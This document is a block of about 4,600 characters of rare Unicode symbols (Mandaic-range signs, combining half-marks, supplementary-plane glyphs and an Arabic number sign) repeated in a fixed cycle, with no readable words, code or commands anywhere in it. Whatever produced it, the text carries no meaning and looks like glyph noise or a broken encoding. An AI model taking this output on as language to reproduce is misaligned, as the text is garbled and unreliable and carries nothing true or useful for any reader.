࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬